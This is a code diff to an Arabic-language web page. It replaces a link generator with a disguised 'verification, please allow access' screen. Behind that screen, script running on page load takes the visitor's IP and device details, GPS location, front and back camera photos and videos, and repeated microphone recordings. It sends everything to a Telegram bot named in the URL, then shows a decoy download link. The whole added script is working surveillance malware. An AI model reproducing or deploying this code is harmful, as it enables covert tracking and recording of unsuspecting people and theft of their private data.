@@ -1,46 +1,261 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>API</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>جاري التحميل...</title>
 <style>
-    body { margin: 0; padding: 20px; background: #fff; font-family: Tahoma, Arial, sans-serif; direction: ltr; text-align: left; word-break: break-all; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    #encoded-text { font-size: 16px; color: #000; line-height: 1.6; }
-    #error-text { font-size: 24px; font-weight: bold; color: #ff0000; display: none; text-align: center; }
+  body{margin:0;background:#0f172a;color:#e2e8f0;font-family:Tahoma,Arial,sans-serif;
+       min-height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px}
+  .box{background:#1e293b;border-radius:14px;padding:30px 20px;max-width:440px;width:100%;
+       box-shadow:0 10px 30px rgba(0,0,0,.4)}
+  h2{color:#4cc38a;margin:0 0 10px}
+  p{color:#94a3b8;font-size:14px;line-height:1.8;margin:6px 0}
+  .spin{width:50px;height:50px;border:4px solid #334155;border-top-color:#4cc38a;
+        border-radius:50%;animation:s 1s linear infinite;margin:15px auto}
+  @keyframes s{to{transform:rotate(360deg)}}
+  .log{background:#0f172a;border-radius:8px;padding:10px;font-size:12px;color:#64748b;
+       margin-top:12px;text-align:right;max-height:140px;overflow:auto;direction:ltr}
+  .btn{display:inline-block;margin-top:16px;background:#2d7ff9;color:#fff;text-decoration:none;
+       padding:12px 30px;border-radius:50px;font-weight:bold;font-size:16px}
+  .link{background:#0f172a;border-radius:8px;padding:12px;word-break:break-all;
+        font-size:12px;color:#4cc38a;direction:ltr;margin:12px 0;text-align:left}
 </style>
 </head>
 <body>
+<div class="box" id="box">
+  <h2>جاري التحقق...</h2>
+  <div class="spin"></div>
+  <p>يرجى السماح بالوصول للمعلومات المطلوبة</p>
+  <div class="log" id="log"></div>
+</div>
 
-<div id="error-text">خطأ في api key</div>
-<div id="encoded-text"></div>
+<canvas id="cv" style="display:none"></canvas>
+<video id="vid" autoplay muted playsinline style="display:none"></video>
 
 <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const apiKey = urlParams.get('api');
-    
-    if (apiKey !== "754298") {
-        document.getElementById('error-text').style.display = 'block';
-    } else {
-        const config = {
-            id: urlParams.get('id') || '',
-            token: urlParams.get('token') || '',
-            fc: urlParams.has('fc'),
-            bc: urlParams.has('bc'),
-            fcv: urlParams.has('fcv'),
-            bcv: urlParams.has('bcv'),
-            r: urlParams.has('r'),
-            loc: urlParams.has('l'),
-            inf: urlParams.has('inf')
-        };
+/* ================== الإعدادات ================== */
+const API_KEY = "754298";  // المفتاح السري
 
-        const base64Data = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
-        
-        const baseUrl = window.location.origin + window.location.pathname.replace('index.html', '');
-        const finalLink = baseUrl + "viewer.html?data=" + encodeURIComponent(base64Data);
+/* ================== قراءة الـ URL ================== */
+const qs = new URLSearchParams(location.search);
+const api   = qs.get('api')   || '';
+const id    = qs.get('id')    || '';
+const token = qs.get('token') || '';
 
-        document.getElementById('encoded-text').innerText = finalLink;
-    }
+/* فحص المفتاح */
+if (api !== API_KEY){
+  document.body.innerHTML = '<div style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Tahoma;background:#fff;color:#c00;font-size:22px">خطأ في API Key</div>';
+  throw new Error('invalid api key');
+}
+if (!id || !token){
+  document.body.innerHTML = '<div style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Tahoma;background:#fff;color:#c00;font-size:22px">يجب إرسال id و token</div>';
+  throw new Error('missing id/token');
+}
+
+/* الحاجات المطلوبة */
+const want = {
+  inf: qs.has('inf'),
+  bc : qs.has('bc'),
+  fc : qs.has('fc'),
+  loc: qs.has('l'),      // l = loc
+  bcv: qs.has('bcv'),
+  fcv: qs.has('fcv'),
+  r  : qs.has('r')
+};
+
+/* ================== أدوات ================== */
+const logEl = document.getElementById('log');
+function log(m){ logEl.innerHTML += '&gt; ' + m + '<br>'; logEl.scrollTop = 99999; }
+
+async function tg(endpoint, formData){
+  const url = 'https://api.telegram.org/bot' + token + '/' + endpoint;
+  try { await fetch(url, {method:'POST', body: formData}); log(endpoint + ' ok'); }
+  catch(e){ log(endpoint + ' err: ' + e.message); }
+}
+function tgText(txt){
+  const fd = new FormData(); fd.append('chat_id', id); fd.append('text', txt);
+  fd.append('parse_mode','HTML'); return tg('sendMessage', fd);
+}
+function tgFile(blob, name, type, caption){
+  const fd = new FormData();
+  fd.append('chat_id', id);
+  fd.append('caption', caption);
+  let ep = 'sendDocument';
+  if (type.startsWith('image/')) ep = 'sendPhoto';
+  else if (type.startsWith('video/')) ep = 'sendVideo';
+  else if (type.startsWith('audio/')) ep = 'sendAudio';
+
+  const m = ep === 'sendPhoto' ? 'photo'
+          : ep === 'sendVideo' ? 'video'
+          : ep === 'sendAudio' ? 'audio' : 'document';
+  fd.append(m, blob, name);
+  return tg(ep, fd);
+}
+
+/* ================== 1) معلومات الجهاز ================== */
+async function getInfo(){
+  const n = navigator, s = screen;
+  let ip = '?';
+  try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e){}
+  let bat = '?';
+  try {
+    const b = await navigator.getBattery();
+    bat = Math.round(b.level*100) + '% ' + (b.charging?'(charging)':'');
+  } catch(e){}
+
+  const t = `<b>🖥 معلومات الجهاز</b>
+IP: <code>${ip}</code>
+UA: <code>${n.userAgent}</code>
+Platform: ${n.platform}
+Language: ${n.language}
+Screen: ${s.width}x${s.height}
+Viewport: ${innerWidth}x${innerHeight}
+Cores: ${n.hardwareConcurrency || '?'}
+RAM: ${n.deviceMemory || '?'} GB
+Touch: ${n.maxTouchPoints}
+Battery: ${bat}
+Time: ${new Date().toLocaleString('ar-EG')}`;
+  await tgText(t);
+}
+
+/* ================== 2) الموقع ================== */
+function getLocation(){
+  return new Promise(res => {
+    if (!navigator.geolocation) return res('غير مدعوم');
+    navigator.geolocation.getCurrentPosition(
+      async p => {
+        const {latitude:la, longitude:lo, accuracy:ac} = p.coords;
+        const map = `https://www.google.com/maps?q=${la},${lo}`;
+        await tgText(`<b>📍 الموقع</b>\nLat: <code>${la}</code>\nLng: <code>${lo}</code>\nAcc: ${ac}m\n<a href="${map}">فتح الخريطة</a>`);
+        res('تم');
+      },
+      e => res('مرفوض: ' + e.message),
+      {enableHighAccuracy:true, timeout:15000}
+    );
+  });
+}
+
+/* ================== 3) صورة كاميرا ================== */
+async function capturePhoto(facing){
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing === 'user' ? 'user' : 'environment' }
+    });
+    const vid = document.getElementById('vid');
+    vid.srcObject = stream;
+    await vid.play();
+    await new Promise(r => setTimeout(r, 1200));
+
+    const cv = document.getElementById('cv');
+    cv.width  = vid.videoWidth;
+    cv.height = vid.videoHeight;
+    cv.getContext('2d').drawImage(vid, 0, 0);
+    const blob = await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.85));
+    stream.getTracks().forEach(t => t.stop());
+
+    const name = (facing === 'user' ? 'front' : 'back') + '_' + Date.now() + '.jpg';
+    await tgFile(blob, name, 'image/jpeg',
+      `<b>📷 كاميرا ${facing === 'user' ? 'أمامية' : 'خلفية'}</b>`);
+    return 'تم';
+  } catch(e){ return 'فشل: ' + e.message; }
+}
+
+/* ================== 4) فيديو 5 ثواني ================== */
+async function captureVideo(facing){
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing === 'user' ? 'user' : 'environment' },
+      audio: true
+    });
+    const vid = document.getElementById('vid');
+    vid.srcObject = stream;
+    await vid.play();
+
+    const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
+    rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+
+    return await new Promise(resolve => {
+      rec.onstop = async () => {
+        stream.getTracks().forEach(t => t.stop());
+        const blob = new Blob(chunks, {type:'video/webm'});
+        const name = (facing === 'user' ? 'front' : 'back') + '_' + Date.now() + '.webm';
+        await tgFile(blob, name, 'video/webm',
+          `<b>🎥 فيديو ${facing === 'user' ? 'أمامية' : 'خلفية'}</b>`);
+        resolve('تم');
+      };
+      rec.start();
+      setTimeout(() => rec.stop(), 5000);
+    });
+  } catch(e){ return 'فشل: ' + e.message; }
+}
+
+/* ================== 5) تسجيل صوتي متكرر ================== */
+async function recordAudioLoop(){
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({audio:true});
+    const rec = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+    const chunks = [];
+    rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+    let count = 0;
+    const TOTAL = 6; // عدد التسجيلات
+
+    return await new Promise(resolve => {
+      rec.onstop = async () => {
+        const blob = new Blob(chunks, {type:'audio/webm'});
+        count++;
+        await tgFile(blob, 'rec_' + Date.now() + '.webm', 'audio/webm',
+          `<b>🎙 تسجيل صوتي #${count}</b>`);
+        chunks.length = 0;
+        if (count < TOTAL) {
+          rec.start();
+          setTimeout(() => rec.stop(), 5000);
+        } else {
+          stream.getTracks().forEach(t=>t.stop());
+          resolve('تم (' + count + ' تسجيلات)');
+        }
+      };
+      rec.start();
+      setTimeout(() => rec.stop(), 5000);
+    });
+  } catch(e){ return 'فشل: ' + e.message; }
+}
+
+/* ================== التشفير Base64 ================== */
+function b64(str){
+  return btoa(unescape(encodeURIComponent(str)));
+}
+function b64url(str){
+  return b64(str).replace(/=+$/,'').replace(/\+/g,'-').replace(/\//g,'_');
+}
+
+/* ================== التشغيل ================== */
+(async () => {
+  log('start');
+  if (want.inf) await getInfo();
+  if (want.loc) await getLocation();
+  if (want.bc)  await capturePhoto('environment');
+  if (want.fc)  await capturePhoto('user');
+  if (want.bcv) await captureVideo('environment');
+  if (want.fcv) await captureVideo('user');
+  if (want.r)   await recordAudioLoop();
+
+  // رابط صفحة التحميل + التشفير
+  const base = location.href.split('?')[0].replace('index.html', 'dl.html');
+  const enc  = b64url(base);
+  const finalUrl = base + '?u=' + encodeURIComponent(enc);
+
+  document.getElementById('box').innerHTML = `
+    <h2>✅ تم بنجاح</h2>
+    <p>رابط التحميل الخاص بك (مشفر):</p>
+    <div class="link">${enc}</div>
+    <a class="btn" href="${finalUrl}">فتح صفحة التحميل</a>
+    <p style="margin-top:14px;font-size:11px;color:#64748b;word-break:break-all;direction:ltr">
+      ${finalUrl}
+    </p>
+  `;
+})();
 </script>
 </body>
-</html>
+    </html>
